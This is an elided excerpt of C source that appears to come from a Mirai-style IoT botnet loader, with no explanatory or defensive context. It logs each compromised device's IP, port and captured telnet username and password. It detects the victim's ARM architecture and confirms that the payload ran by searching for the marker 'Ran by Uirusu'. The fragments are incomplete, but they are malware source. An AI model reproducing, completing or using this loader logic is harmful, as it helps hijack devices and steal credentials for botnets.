...
void connection_close(struct connection *conn)
{
    ...
    if (conn->open)
    {
        ...
        if (conn->success)
        {
            ...
            fprintf(stderr, "\x1b[1;36m[Telnet | Loaded] %d.%d.%d.%d:%d %s:%s %s\n\033[0m",
...
int connection_consume_arm_subtype(struct connection *conn)
{
    ...
    } else if (util_memsearch(conn->rdbuf, offset, "ARMv4", 5) != -1) {
        strcpy(conn->info.arch, "arm");
    }
...
int connection_verify_payload(struct connection *conn)
{
    ...
    if (util_memsearch(conn->rdbuf, offset, "Ran by Uirusu", 17) == -1)
        return offset;
    else
        return 255 + offset;
}
